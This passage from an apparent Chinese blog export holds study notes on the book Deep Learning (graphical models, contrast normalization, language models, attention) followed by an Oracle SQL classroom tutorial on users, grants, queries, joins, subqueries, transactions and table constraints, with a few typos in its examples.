相比图模型，基于查表的模型拥有天文数字级别的参数，为了准确地拟合，相应的训练集的大小也是相同级别的。 减少运行时间 推断的开销：计算分布时，避免对整个表的操作，比如求和 采样的开销：类似推断，避免读取整个表格 《深度学习》 16.3 从图模型中采样 图模型如何用于深度学习 受限玻尔兹曼机（RBM） RBM 是图模型如何用于深度学习的典型例子 RBM 本身不是一个深层模型，它有一层潜变量，可用于学习输入的表示。但是它可以被用来构建许多的深层模型。 其他相关名词： 信念网络（有向图模型） 马尔可夫网络（无向图模型） 配分函数 能量模型（无向图模型） 分离（separation）/d-分离 道德图（moralized graph）、弦图（chordal graph） 因子图（factor graph） Gibbs 采样 结构学习（structure learning） 深度生成模型、受限玻尔兹曼机（RBM）相关概念* 《深度学习》 16.7.1 实例：受限玻尔兹曼机、20.1 玻尔兹曼机、20.2 受限玻尔兹曼机 深度学习在图像、语音、NLP等领域的常见作法与基本模型** 《深度学习》 12 应用 计算机视觉（CV） 12.2 计算机视觉 预处理 许多应用领域需要复杂精细的预处理，但是 CV 通常只需要相对少的预处理。 通常，标准化是图像唯一必要的预处理——将图像格式化为具有相同的比例，比如 [0,1] 或者 [-1,1]. 许多框架需要图像缩放到标准的尺寸。但这不是必须的，一些卷积模型接受可变大小的输入并动态地调整它们的池化区域大小以保持输出大小恒定。 其他预处理操作： 对比度归一化 在许多任务中，对比度是能够安全移除的最为明显的变化源之一。简单地说，对比度指的是图像中亮像素和暗像素之间差异的大小。 整个图像的对比度可以表示为： ，其中 ，整个图片的平均强度 全局对比度归一化（Global contrast normalization, GCN） GCN 旨在通过从每个图像中减去其平均值，然后重新缩放其使得其像素上的标准差等于某个常数 s 来防止图像具有变化的对比度。定义为： 从大图像中剪切感兴趣的对象所组成的数据集不可能包含任何强度几乎恒定的图像。此时，设置 λ = 0 来忽略小分母问题是安全的。(Goodfellow et al. 2013c) 随机剪裁的小图像更可能具有几乎恒定的强度，使得激进的正则化更有用。此时可以加大 λ (ϵ = 0, λ = 10; Coates et al. 2011) 尺度参数 s 通常可以设置为 1 (Coates et al. 2011)，或选择使所有样本上每个像素的标准差接近 1 (Goodfellow et al. 2013c) GCN 的意义 式中的标准差可以看作是对图片 L2 范数的重新缩放（假设移除了均值），但我们倾向于标准差而不是 L2 范数来定义 GCN，是因为标准差包括除以像素数量这一步，从而基于标准差的 GCN 能够使用与图像大小无关的固定的 s. 而将标准差视为 L2 范数的缩放，可以将 GCN 理解成到球壳的一种映射。这可能是一个有用的属性，因为神经网络往往更好地响应空间方向，而不是精确的位置。 (左) 原始的输入数据可能拥有任意的范数。 (中) λ = 0 时候的 GCN 可以完美地将所有的非零样本投影到球上。这里我们令 s = 1， ϵ = 10−8。由于我们使用的 GCN 是基于归一化标准差而不是 L2 范数，所得到的球并不是单位球。 (右) λ &gt; 0 的正则化 GCN 将样本投影到球上，但是并没有完全地丢弃其范数中变化。 s 和 ϵ 的取值与之前一样。 GCN 的问题： 全局对比度归一化常常不能突出我们想要突出的图像特征，例如边缘和角。 例子：如果我们有一个场景，包含了一个大的黑暗区域和一个大的明亮的区域（例如一个城市广场有一半的区域处于建筑物的阴影之中），则全局对比度归一化将确保暗区域的亮度与亮区域的亮度之间存在大的差异。然而，它不能确保暗区内的边缘突出。 局部对比度归一化（local contrast normalization, LCN） GCN 存在的问题催生了 LCN LCN 确保对比度在每个小窗口上被归一化，而不是作为整体在图像上被归一化。 LCN 通常可以通过使用可分离卷积来计算特征映射的局部平均值和局部标准差，然后在不同的特征映射上使用逐元素的减法和除法。 LCN 是可微分的操作，并且还可以作为一种非线性作用应用于网 络隐藏层，以及应用于输入的预处理操作。 数据集增强 数据集增强可以被看作是一种 只对训练集做预处理的方式。 语音识别 12.3 语音识别 本章没什么实际内容，主要介绍了各阶段的主流模型 自动语音识别（Automatic Speech Recognition, ASR）任务指的是构造一个函数 f*，使得它能够在给定声学序列 X 的情况下计算最有可能的语言序列 y. 令 X = (x(1), x(2), …, x(T)) 表示语音的输入向量，传统做法以 20ms 左右为一帧分割信号；y = (y1, y2, …, yN) 表示目标的输出序列（通常是一个词或者字符的序列。 许多语音识别的系统通过特殊的手工设计方法预处理输入信号，从而提取声学特征；也有一些深度学习系统 (Jaitly and Hinton, 2011) 直接从原始输入中学习特征。 自然语言处理 12.4 自然语言处理 相关术语： n-gram 语言模型 神经语言模型（Neural Language Model, NLM） 结合 n-gram 和神经语言模型 分层 Softmax 神经机器翻译 注意力机制 n-gram 语言模型 语言模型（language model）定义了自然语言中标记序列的概率分布。根据模型的设计，标记可以是词、字符、甚至是字节。标记总是离散的实体。 n-gram 是最早成功的语言模型 一个 n-gram 是一个包含 n 个标记的序列。 基于 n-gram 的模型定义一个条件概率——给定前 n − 1 个标记后的第 n 个标记的条件概率： 训练 n-gram 模型很简单，因为最大似然估计可以通过简单地统计每个可能的 n-gram 在训练集中出现的频数来获得。 通常我们同时训练 n-gram 模型和 n − 1 gram 模型。这使得下式可以简单地通过查找两个存储的概率来计算。 n-gram 模型的缺点： 稀疏问题——n-gram 模型最大似然的基本限制是，在许多情况下从训练集计数估计得到的 Pn 很可能为零。由此产生了各种平滑算法。 维数灾难——经典的 n-gram 模型特别容易引起维数灾难。因为存在 |V|^n 可能的 n-gram，而且 |V| 通常很大。 神经语言模型（Neural Language Model, NLM） NLM 是一类用来克服维数灾难的语言模型，它使用词的分布式表示对自然语言序列建模 NLM 能在识别两个相似词的同时，不丧失将词编码为不同的能力。神经语言模型共享一个词（及其上下文）和其他类似词的统计强度。模型为每个词学习的分布式表示，允许模型处理具有类似共同特征的词来实现这种共享。因为这样的属性很多，所以存在许多泛化的方式，可以将信息从每个训练语句传递到指数数量的语义相关语句。 例如，如果词 dog 和词 cat 映射到具有许多属性的表示，则包含词 cat 的句子可以告知模型对包含词 dog 的句子做出预测，反之亦然。 使用分布式表示来改进自然语言处理模型的基本思想不必局限于神经网络。它还可以用于图模型，其中分布式表示是多个潜变量的形式 (Mnih and Hinton, 2007)。 词嵌入（word embedding） 词的分布时表示称为词嵌入，在这个解释下，我们将原始符号视为维度等于词表大小的空间中的点。词表示将这些点嵌入到较低维的特征空间中。 在原始空间中，每个词由一个one-hot向量表示，因此每对词彼此之间的欧氏距离都是 √2。 在嵌入空间中，经常出现在类似上下文中的词彼此接近。这通常导致具有相似含义的词变得邻近。 这些嵌入是为了可视化才表示为 2 维。在实际应用中，嵌入通常具有更高的维度并且可以同时捕获词之间多种相似性。 高维输出 对于大词汇表，由于词汇量很大，在词的选择上表示输出分布的计算和存储成本可能非常高。 表示这种分布的朴素方法是应用一个仿射变换，将隐藏表示转换到输出空间，然后应用 softmax 函数。因为 softmax 要在所有输出之间归一化，所以需要执行全矩阵乘法，这是高计算成本的原因。因此，输出层的高计算成本在训练期间（计算似然性及其梯度）和测试期间（计算所有或所选词的概率）都有出现。 一些解决方案 使用短列表——简单来说，就是限制词表的大小 分层 Softmax 重要采样——负采样就是一种简单的重要采样方式 分层 Softmax 减少大词汇表 V 上高维输出层计算负担的经典方法 (Goodman, 2001) 是分层地分解概率。|V| 因子可以降低到 log|V| 一样低，而无需执行与 |V| 成比例数量（并且也与隐藏单元数量成比例）的计算。 我们可以认为这种层次结构是先建立词的类别，然后是词类别的类别，然后是词类别的类别的类别等等。这些嵌套类别构成一棵树，其叶子为词。 选择一个词的概率是由路径（从树根到包含该词叶子的路径）上的每个节点通向该词分支概率的乘积给出。 重要采样/负采样 加速神经语言模型训练的一种方式是，避免明确地计算所有未出现在下一位置的词对梯度的贡献。 每个不正确的词在此模型下具有低概率。枚举所有这些词的计算成本可能会很高。相反，我们可以仅采样词的子集。 结合 n-gram 和神经语言模型 n-gram 模型相对神经网络的主要优点是具有更高的模型容量（通过存储非常多的元组的频率），并且处理样本只需非常少的计算量。 相比之下，将神经网络的参数数目加倍通常也大致加倍计算时间。 增加神经语言模型容量的一种简单方法是将之与 n-gram 方法结合，集成两个模型 神经机器翻译（NMT） 编码器和解码器的想法 (Allen 1987; Chrisman 1991; Forcada and Ñeco 1997)很早就应用到了 NMT 中。 基于 MLP 方法的缺点是需要将序列预处理为固定长度。为了使翻译更加灵活，我们希望模型允许可变的输入长度和输出长度。所以大量的 NMT 模型使用 RNN 作为基本单元。 注意力（Attention）机制 使用固定大小的表示概括非常长的句子（例如 60 个词）的所有语义细节是非常困难的。这需要使用足够大的 RNN。这会带来一些列训练问题。 更高效的方法是先读取整个句子或段落（以获得正在表达的上下文和焦点），然后一次翻译一个词，每次聚焦于输入句子的不同部分来收集产生下一个输出词所需的语义细节 (Bahdanau et al., 2015)——Attention 机制 由 Bahdanau et al. (2015) 引入的现代注意力机制，本质上是加权平均。 其他应用： 推荐系统 知识表示、推理和回答 本文链接： http://www.meng.uno/articles/f42d8431/ 欢迎转载！","categories":[{"name":"DeepLearning","slug":"DeepLearning","permalink":"http://www.meng.uno/categories/DeepLearning/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://www.meng.uno/tags/深度学习/"},{"name":"AI","slug":"AI","permalink":"http://www.meng.uno/tags/AI/"}]},{"title":"Oracle教程","slug":"oracle","date":"2018-04-04T06:56:38.000Z","updated":"2018-04-04T08:08:39.319Z","comments":true,"path":"articles/33c755f8/","link":"","permalink":"http://www.meng.uno/articles/33c755f8/","excerpt":"Oracle第一章 1. 首先打开Oracle服务 2. 配置监听器（这个是因为教室的电脑Oracle安装有问题，没有配置好监听器）开始菜单中找到net configration assistant添加一个监听器 3. 用system用户登录sqlplus 4. 解锁scott用户 :（也是因为教室的Oracle安装问题导致scott账户未解锁） 1 alter user scott account unlock; 5. 修改scott密码: 1 alter user scott identified by tiger; 6. 使用scott登录sqlplus,","text":"Oracle第一章 首先打开Oracle服务 配置监听器（这个是因为教室的电脑Oracle安装有问题，没有配置好监听器）开始菜单中找到net configration assistant添加一个监听器 用system用户登录sqlplus 解锁scott用户 :（也是因为教室的Oracle安装问题导致scott账户未解锁） 1 alter user scott account unlock; 修改scott密码: 1 alter user scott identified by tiger; 使用scott登录sqlplus, scott是oracle自带的一个实例账户，它带有四个实例表,其中重要的就是emp员工表与dept部门表 安装PL/SQL第三方工具, 因为Oracle没有自带的图形化界面管理器，所以我们需要安装PLSQL，它是oracle的一个第三方GUI工具。 介绍一下Oracle的命令 连接数据库： 1 connect scoott/tiger@orcl; 用户名为scott，密码为tiger,数据库名为orcl 显示当前用户： 1 show user; 也可使用查询语句： 1 select USER from dual; --dual是oracle的一个虚拟表 显示表结构(以emp表为例)： 1 describe emp; 可简写为： 1 desc emp; Oracle第二章 创建表空间 （在SqlServer中称为创建一个是数据库，而在Oracle中则称为创建一个表空间） 格式： create tablespace 表空间名 datafile ‘文件路径’ size 文件大小 如： cerate tablespace myspace datafile 'D:\\myspace.dbf' size 10MB; 删除表空间： drop tablespace myspace incluiding contents and datafile; 创建用户 格式： create user 用户名 identified by 密码 default tablespace 默认表空间 如： create user user1 identified by user1 default tablespace system; 删除用户： drop user user1 cascade; 给用户授权 方式一：授予角色 1、connect //登录 2、resource //普通权限，用于操作 3、DBA //管理员权限（慎用） 如： grant connect to user1; grant connect,resource to user1; 方式二：授予单个权限 如： grant create table to user1; //授予user1建表的权限 grant drop table to user1; //授予user1删表的权限 方式三：将某个对象的权限授予用户 如： grant select on scott.emp to user1; //将scott用户的emp表的查询权限授予user1 grant all on scott.emp to user1; //将scott用户的emp表的所有权限授予user1 收回权限： 格式： revoke 权限 from 用户 如： revoke connect from user1; //收回user1的connect权限 revoke select on scott.emp from user1; //收回user1对emp表的查询权限 Oracle第三章 基本查询 select格式： 12345 select 列名 from 表名 ；where 查询条件group by 分组列having 分组后条件order by 排序列 asc[desc] 如：查询部门10的雇员 select * from emp where deptno=10; 行号（rownum） 每个表都有一个虚列ROWNUM，它用来显示结果中记录的行号。我们在查询中也可以显示这个列。 如：显示emp表的行号 select rownum,ename from emp; 如：显示前三行 select * from emp where rownum&lt;=3; 查询进行计算 如：显示雇员工资上浮20%的结果 select ename,sal,sal*(1+20%) from emp; 如：显示每个员工的总工资（工资+奖金） update emp set comm = o where comm is null; //因为null的特殊性，它与任何值运算都等于null，所以先要把它更新为0，后面我们会学到一个函数来处理null值 select ename,sal+comm from emp; 使用别名 如：在查询中使用列别名 select ename as 名称，sal as 工资 from emp; //建议省略as 另，在别名为关键字或有特殊符号时需要加双引号 如： select ename as &quot;select&quot;,sal*12+5000 as &quot;年度工资（加年终奖）&quot; from emp; 连接运算符 连接运算符是双竖线“||”。通过连接运算可以将两个字符串连接在一起。 如：在查询中使用连接运算 select ename||job as &quot;雇员和职务表&quot; from emp; *注意：‘5’||5结果为’55’ ‘5’+5结果为 10 * 六、消除重复行（distinct） 如果在显示结果中存在重复行，可以使用关键字distinct消除重复显示 如：统计职务的数量 select count(distinct job) from emp; 排序 1、升序（默认为升序asc,所以可以忽略） 如：查询雇员姓名和工资，并按工资从小到大排序 select ename,sal from emp order by sal asc; 2、降序（desc不可忽略） 如：查询雇员姓名和雇佣日期，并按雇佣日期排序，后雇佣的先显示 select ename,hiredate from emp order by hiredate desc; 3、多列排序 可以按多列进行排序，先按第一列，然后按第二列、第三列…。 如：查询雇员信息，先按部门从小到大排序，再按雇佣时间的先后排序 select ename,deptno,hiredate from emp order by deptno hiredate; Oracle第四章——条件查询、字符型函数 条件查询 1、模糊查询(between、in、like) A、between：在某某之间。如,显示工资在1000~2000之间的雇员 select * from emp where sal beteween 1000 and 2000; B、in：在某某之间。如，显示职务为“SALMAN”，“CLEARK”和“MANAGER”的雇员信息 select * from emp where job in ('SALMAN','CLERK','MANAGER'); C、like：与通配符使用 通配符：% 代表0个或任意个字符 —_ 代表1个字符 如：显示姓名以“S”开头的雇员信息。 select * from emp where ename like 'S%'; 显示姓名第二个字符为“A”的雇员信息 select * from emp ename like '_A%'; 2、空值查询 空：is null 非空： is not null 如：查询奖金为空的雇员信息 select * from emp where comm is null; 函数 1、数学函数 函数 功能 实例 结果 abs 求绝对值函数 abs(-5) 5 sqrt 求平方根 sqrt(2) 1.414 power 求幂函数 power(2,3) 8 使用求绝对值函数abs select abs(-5) from dual; 使用求平方根函数sqrt。 select sqrt(2) from dual; 使用ceil函数。 select ceil(2.35) from dual; 使用floor函数。 select floor(2.35) from dual; 2、使用四舍五入函数round 格式：round(数字，保留的位数) select round(45.923,2), round(45.923,0), round(45.923,-1) from dual; 3、字符型函数 ascii返回与ASCII码相应的字符Ascii('A')65char返回与ASCII码相应的字符char(65)Alower将字符串转换成小写lower ('SQL Course')sql courseupper将字符串转换成upper('SQL Course')SQL COURSEinitcap将字符串转换成每个单词以大写开头initcap('SQL course')SQL Courseconcat连接两个字符串concat('SQL', ' Course')SQL Coursesubstr给出起始位置和长度，返回子字符串substr('String',1,3)Strlength求字符串的长度length('Wellcom')7trim在一个字符串中去除另一个字符串trim('S' FROM 'SSMITH')MITHreplace用一个字符串替换另一个字符串中的子字符串replace('ABC', 'B', 'D')ADC 如果不知道表的字段内容是大写还是小写，可以转换后比较。 select empno, ename,deptno from emp where lower(ename)='blake'; 显示名称以“W”开头的雇员，并将名称转换成以大写开头。 select empno,initcap(ename),job from emp wher substr(ename,1,1)='W'; 显示雇员名称中包含“S”的雇员名称及名称长度。 select empno,ename,legth(ename) from emp where instr(ename,'S',1,1)&gt;0; Oracle第五章——函数 日期型函数 Oracle使用内部数字格式来保存时间和日期，包括世纪、年、月、日、小时、分、秒。缺省日期格式为 DD-MON-YY，如“08-05月-03”代表2003年5月8日。 SYSDATE：返回系统日期和时间的虚列函数。 如：返回系统的当前日期。 SELECT sysdate FROM dual; 对两个日期相减，得到相隔天数。 通过加小时来增加天数，24小时为一天，如12小时可以写成12/24(或0.5)。 如：例1 假定当前的系统日期是2003年2月6日，求再过1000天的日期。 SELECT sysdate+1000 AS &quot;NEW DATE&quot; FROM dual; 例2：两个日期相减 select to_date('1-1月-2000') - to_date('1-8月-1999') from dual; 其它日期函数 函数 功能 实例 结果 months_between 返回两个日期间的月份 months_between (‘04-11月-05’,‘11-1月-01’)57.7741935 add_months 返回把月份数加到日期上的新日期 add_months(‘06-2月-03’,1)，add_months(‘06-2月-03’,-1) 06-3月-03，06-1月-03 next_day 返回指定日期后的星期对应的新日期 next_day(‘06-2月-03’,‘星期一’) 10-2月-03 last_day 返回指定日期所在的月的最后一天 last_day(‘06-2月-03’) 28-2月-03 round 按指定格式对日期进行四舍五入 round(to_date(‘13-2月-03’),‘YEAR’)，round(to_date(‘13-2月-03’),‘MONTH’)，round(to_date(‘13-2月-03’),‘DAY’) 01-1月-03，01-2月-03，16-2月-03(按周四舍五入) 如：返回2003年2月的最后一天。 SELECT last_day('08-2月-03') FROM dual; 假定当前的系统日期是2003年2月6日，显示部门10雇员的雇佣天数。 SELECT ename, round(sysdate-hiredate) DAYS FROM emp WHERE deptno = 10; 转换函数 函数 功能 实例 结果 To_char 转换成字符串类型 To_char(1234.5, ‘$9999.9’) $1234.5 To_date 转换成日期类型 To_date(‘1980-01-01’, ‘yyyy-mm-dd’) 01-1月-80 To_number 转换成数值类型 To_number(‘1234.5’) 1234.5 自动类型转换 12SELECT &apos;12.5&apos;+11 FROM dual; //结果为：23.5Select ‘12.5’||11 from dual; //结果为：’12.511’ 日期类型转换 代码 代表的格式 例子 AM、PM 上午、下午 08 AM D 数字表示的星期(1～7) 1,2,3,4,5,6,7 DD 数字表示月中的日期(1～31) 1,2,3,…,31 MM 两位数的月份 01,02,…,12 Y、YY、YYY、YYYY 年份的后几位 3,03,003,2003 RR 解决Y2K问题的年度转换 DY 简写的星期名 MON,TUE,FRI,… DAY 全拼的星期名 MONDAY,TUESDAY,… MON 简写的月份名 JAN,FEB,MAR,… MONTH 全拼的月份名 JANUARY,FEBRUARY,… HH、HH12 12小时制的小时(1～12) 1,2,3,…,12 HH24 24小时制的小时(0～23) 0,1,2,…,23 MI 分(0～59) 0,1,2,…,59 SS 秒(0～59) 0,1,2,…,59 ,./-;: 原样显示的标点符号 ‘TEXT’ 引号中的文本原样显示 TEXT 如：1、日期型转字符型 将日期转换成带时间和星期的字符串并显示。 SELECT TO_CHAR(sysdate,'YYYY-MM-DD HH24:MI:SS AM DY') FROM dual; 将日期显示转换成中文的年月日。 SELECT TO_CHAR(sysdate,'YYYY&quot;年&quot;MM&quot;月&quot;DD&quot;日&quot;') FROM dual; 2.字符型转日期型 往emp表中插入一条记录 insert into emp values(8888,'张三','CLERK',7369,to_date('1-1月-2000'),1000,10,10); insert into emp values(8889,'李四','CLERK',7369,to_date('2000-01-01','YYYY-MM-DD'),1000,10,10); 其他常用函数 函数 功能 实例 结果 nvl 空值转换函数 nvl(null, ‘空’) 空 decode 实现分支功能 decode(1,1, ‘男’, 2, ‘女’) 男 userenv 返回环境信息 userenv(‘LANGUAGE’) SIMPLIFIED CHINESE_CHINA.ZHS16GBK greatest 返回参数的最大值 greatest(20,35,18,9) 35 least least返回参数的最小值 least(20,35,18,9) 9 1．空值的转换 如果对空值NULL不能很好的处理，就会在查询中出现一些问题。在一个空值上进行算术运算的结果都是NULL。最典型的例子是，在查询雇员表时，将工资sal字段和津贴字段comm进行相加，如果津贴为空，则相加结果也为空，这样容易引起误解。 使用nvl函数，可以转换NULL为实际值。该函数判断字段的内容，如果不为空，返回原值；为空，则返回给定的值。 如下3个函数，分别用新内容代替字段的空值： nvl(comm, 0)：用0代替空的Comm值。 nvl(hiredate, '01-1月-97')：用1997年1月1日代替空的雇佣日期。 nvl(job, '无')：用“无”代替空的职务。 使用nvl函数转换空值。 SELECT ename,nvl(job,'无'),nvl(hiredate,'01-1月-97'),nvl(comm,0) FROM emp; 2．decode函数 decode函数可以通过比较进行内容的转换，完成的功能相当于分支语句。 在参数的最后位置上可以存在单独的参数，如果以上比较过程没有找到匹配值，则返回该参数的值，如果不存在该参数，则返回NULL。 将职务转换成中文显示。 SELECT ename,decode(job, 'MANAGER', '经理', 'CLERK','职员', 'SALESMAN','推销员', 'ANALYST','系统分析员','未知') FROM emp; 3．最大、最小值函数 greatest返回参数列表中的最大值，least返回参数列表中的最小值。 如果表达式中有NULL，则返回NULL。 Oracle第六章——相等、外连接 相等连接 1、三个步骤 A、先列出要显示的列： select ename,job,comm,emp,deptno,dname B、列出查询的表： from emp,dept C、列出多表相连条件（主外键）：where emp.deptno=dept.deptno 注意：如果两个表有同名列，那么前面必须接表名 如： emp.deptno ,如果不是同名字段则表名可以省略 2、inner join 的写法 select enaem,job,sal,comm,emp.deptno,dname from emp inner join dept on emp.deptno = dept.deptno; 3、三表或三表以上的写法 select 字段1，字段2 , 字段3 。。。。from 表1，表2，表3.。。where 表1.外键 = 表2.主键 and 表1.外键 = 表3.主键 and 。。。 注意：两个表有一个条件 ，三个表有两个条件 ，四个表有三个条件 以此类推 外连接（不等连接） 左外连接即在内连接的基础上，左边表中有但右边表中没有的记录也以null的形式显示出来，右外连接则反之 1、写法1 (右外连接) select ename,d.deptno,dname from emp e,dept d where e.deptno(+) = d.deptno (左外连接) select ename,d.deptno,dname from emp e,dept d where d.deptno = e.deptno(+) 2、写法2 select ename,d.deptno,dname from emp e right join dept d on e.deptno = d.deptno Oracle第七章——连接、分组查询 不等连接 拿一个表作为另一表的查询条件或范围 如：显示雇员名称，工资和所属工资等级。 select e.ename,e.sal,s.grade from emp e,salgrade s where e.sal between s.losal and s.hisal; 自连接 自连接就是一个表，同本身进行连接。对于自连接可以想像存在两个相同的表(表和表的副本)，可以通过不同的别名区别两个相同的表（其它就是内连接) 如：显示雇员名称和雇员的经理名称 select worker.ename||'的经理是'||manager.ename as 雇员经理 from emp worker,emp manager where worker.mgr=manager.empno; 组函数 组函数只能应用于SELECT子句、HAVING子句或ORDER BY子句中。 组函数也可以称为统计函数。 组函数忽略列的空值。 对组可以应用组函数。 在组函数中可使用DISTINCT或ALL关键字。 ALL表示对所有非NULL值(可重复)进行运算。 DISTINCT 表示对每一个非NULL值，如果存在重复值，则组函数只运算一次。如果不指明上述关键字，默认为ALL。 函数 说明 AVG 求平均值 COUNT 求计数值，返回非空行数，*表示返回所有行 MAX 求最大值 MIN 求最小值 SUM 求和 SIDDEV 求标准偏差，是根据差的平方根得到的 VARIANCE 求统计方差 分组查询 1、如：按职务统计工资总和。 select deptno,job,sum(sal) from emp group by deptno,job; 2、多列分组 如：按部门和职务分组统计工资总和: select deptno,job,sum(sal) from emp group by deptno,job; 3、HAVING HAVING从句过滤分组后的结果，它只能出现在GROUP BY从句之后，而WHERE从句要出现在GROUP BY从句之前。 如：统计各部门的最高工资，排除最高工资小于3000的部门。 select deptno,max(sal) from emp group by deptno having max(sal)&gt;=3000; 4、分组统计结果排序 可以使用ORDER BY从句对统计的结果进行排序，ORDER BY从句要出现在语句的最后。 如：按职务统计工资总和并排序。 select job 职务, sum(sal) 工资总和 from emp group by job order by sum(sal); 5、组函数的嵌套使用 如：求各部门平均工资的最高值。 select max(avg(sal)) from emp group by deptno; Oracle第八章——子查询 子查询 通过把一个查询的结果作为另一个查询的一部分,子查询一般出现在SELECT语句的WHERE子句中，Oracle也支持在FROM或HAVING子句中出现子查询。子查询比主查询先执行，结果作为主查询的条件，在书写上要用圆括号扩起来，并放在比较运算符的右侧。 1、单行子查询 如：查询比SCOTT工资高的雇员名字和工资。 select ename,sal from emp where sal&gt;(select sal from emp where empno=7788); 2、多行子查询* 如果子查询返回多行的结果，则我们称它为多行子查询。多行子查询要使用不同的比较运算符号，它们是IN、ANY和ALL。 如:查询工资低于任意一个“CLERK”的工资的雇员信息。 select empno,ename,job,sal from emp where sal &lt; any (select sal from emp where job = 'CLERK') and job &lt;&gt; 'CLERK'; 如： 查询工资比所有的“SALESMAN”都高的雇员的编号、名字和工资。 select empno,ename,job from emp where job in (select job from emp where deptno = 10) and deptno = 20; 3.多列子查询 **如果子查询返回多列，则对应的比较条件中也应该出现多列，这种查询称为多列子查询。以下是多列子查询的训练实例。 ** 如： 查询职务和部门与SCOTT相同的雇员的信息。 select empno, ename,sal from emp where (job,deptno) = (select job,deptno from emp where empno = 7788); 4．在FROM从句中使用子查询 在FROM从句中也可以使用子查询，在原理上这与在WHERE条件中使用子查询类似。有的时候我们可能要求从雇员表中按照雇员出现的位置来检索雇员，很容易想到的是使用rownum虚列。比如我们要求显示雇员表中6～9位置上的雇员，可以用以下方法 如：查询雇员表中排在第6～9位置上的雇员。 select ename, sal, from (select rownum as num,ename,sal from emp where rownum&lt;=9) where num&gt;=6; 集合运算 操作 描述 union 并集，合并两个操作的结果，去掉重复的部分 union all 并集，合并两个操作的结果，保留重复的部分 minus 差集，从前面的操作结果中去掉与后面操作结果相同的部分 intersect 交集，取两个操作结果中相同的部分 如：查询部门10和部门20的所有职务。 select job from emp where deptno = 10 union select job from emp where deptno = 20; 如：查询只在部门表中出现，但没有在雇员表中出现的部门编号。 select deptno from dept minus select deptno from emp; Oracle第九章——增删改、序列、事务 增删改 增： insert into 表名(列名) values (值)； 删： delete from 表名 where 条件； 改： update 表名 set 列名1=值1，列名2=值2... where 条件； 复制数据 1、通过一条查询语句创建一个新表(要求目标表不存在) create table manager as select empno,ename,sal, from emp where job= 'CLERK'; 2、通过一条查询语句复制数据(要求目标表必须已建好) insert into manager select empno,ename,sal from emp where job = 'CLERK'; 序列 1、创建序列 如：创建从2000起始，增量为1 的序列abc： create sequence abc increment by 1 start with 2000 maxvalue 99999 cycle nocache; 2、使用序列 序列名.nextval: 代表下一个值 序列名.currval: 代表当前值 如： insert into manager values(abc.nextval,'小王',2500); insert into manager values(abc.nextval,'小赵'，2800); 事务 两次连续成功的COMMIT或ROLLBACK之间的操作，称为一个事务。在一个事务内，数据的修改一起提交或撤销，如果发生故障或系统错误，整个事务也会自动撤销 数据库事务处理可分为隐式和显式两种。显式事务操作通过命令实现，隐式事务由系统自动完成提交或撤销(回退)工作，无需用户的干预。 1、隐式提交的情况包括： 当用户正常退出SQL*Plus或执行CREATE、DROP、GRANT、REVOKE等命令时会发生事务的自动提交。 2、显示事务: COMMIT 数据库事务提交，将变化写入数据库 ROLLBACK 数据库事务回退，撤销对数据的修改 SAVEPOINT 创建保存点，用于事务的阶段回退 Oracle第十章————建表 建表 格式： create table 表名 ( 列名1 类型 约束, 列名2 类型 约束, ...... ); 如： – 创建出版社表 create table 出版社（ 编号 varchar2(2), 出版社名称 varchar2(30), 地址 varchar2(30), 联系电话 varchar2(20) ）; – 创建图书表 create table 图书 ( 图书编号 VARCHAR2(5), 图书名称 VARCHAR2(30), 出版社编号 VARCHAR2(2), 作者 VARCHAR2(10), 出版日期 DATE, 数量 NUMBER(3), 单价 NUMBER(7,2) ); 通过子查询建表 步骤1：完全复制图书表到“图书1” create table 图书1 as select * from 图书; 步骤2：创建新的图书表“图书2”，只包含书名和单价 create table 图书2（书名，单价） as seelct 图书名称，单价 from 图书； 步骤3：创建新的图书表“图书3”，只包含书名和单价，不复制内容 create table 图书3（书名，单价） as select 图书名称，单价 from 图书 where 1=2； 添加表的约束 主键 primary key PK 唯一 unique UQ 默认值 default DF 检查约束 check CK 外键约束 foreign key FK 方法一：建表的同时添加约束 如： create table stuinfo( sno int primary key not null, --主键 sname varchar2(10) unique not null, --唯一 sex char(2) default '男' check(sex='男' or sex = '女') not null, --默认及检查 saddress varchar2(50) not null, phone char(11), email varchar2(50) ); create table stumarks( marksId int, sno int references stuinfo(sno) not null, --外键 score number(5,1), examDate date default sysdate ); 方法二：建表完成后，再添加约束 如：（之前已建好了出版社表及图书表） –主键约束 alter table 出版社 add constraint PK_编号 primary key (编号); –唯一约束 alter table 出版社 add constraint UQ_地址 unique (地址); –检查约束 alter table 出版社 add constraint CK_联系电话 check (联系电话 like '1%'); –默认值 alter table 出版社 modify 地址 default '湘潭'; –外键约束 alter table 图书 add constraint FK_图书编号 foreign key (图书编号) references 出版社(编号); –外键约束 alter table 图书 add constraint FK_图书编号 foreign key (图书编号) references 出版社(编号); 查看约束条件 数据字典USER_CONSTRAINTS中包含了当前模式用户的约束条件信息。其中，CONSTRAINTS_TYPE 显示的约束类型为： C：CHECK约束。 P：PRIMARY KEY约束。 U：UNIQUE约束。 R：FOREIGN KEY约束。 其他信息可根据需要进行查询显示，可用DESCRIBE命令查看USER_CONSTRAINTS的结构。 如:检查表的约束信息： SELECT CONSTRAINT_NAME,CONSTRAINT_TYPE,SEARCHCONDITON FROM USER_CONSTRAINTS WHERE TABLE_NAME='图书'; 删除约束条件 ALTER TABLE 表名 DROP CONSTRAINT 约束名; 表的操作 1、删除表 drop table 表名 2、重命名表 RENAME 表名 TO 新表名; 3、查看表 可以通过对数据字典USER_OBJECTS的查询，显示当前模式用户的所有表。 如： 显示当前用户的所有表。 SELECT object_name FROM user_objects WHERE object_type='TABLE'; 修改表 1、增加新列: 如： 为“出版社”增加一列“电子邮件”： ALTER TABLE 出版社 ADD 电子邮件 VARCHAR2(30) CHECK(电子邮件 LIKE '%@%'); 2、修改列 修改列定义有以下一些特点： (1) 列的宽度可以增加或减小，在表的列没有数据或数据为NULL时才能减小宽度。 (2) 在表的列没有数据或数据为NULL时才能改变数据类型，CHAR和VARCHAR2之间可以随意转换。 (3) 只有当列的值非空时，才能增加约束条件NOT NULL。 (4) 修改列的默认值，只影响以后插入的数据。如：修改“出版社”表“电子邮件”列的宽度为40。 ALTER TABLE 出版社 MODIFY 电子邮件 VARCHAR2(40); 3、删除列 如：删除“出版社”表的“电子邮件”列。 ALTER TABLE 出版社 DROP COLUMN 电子邮件; Oracle第十一章————视图 分区表 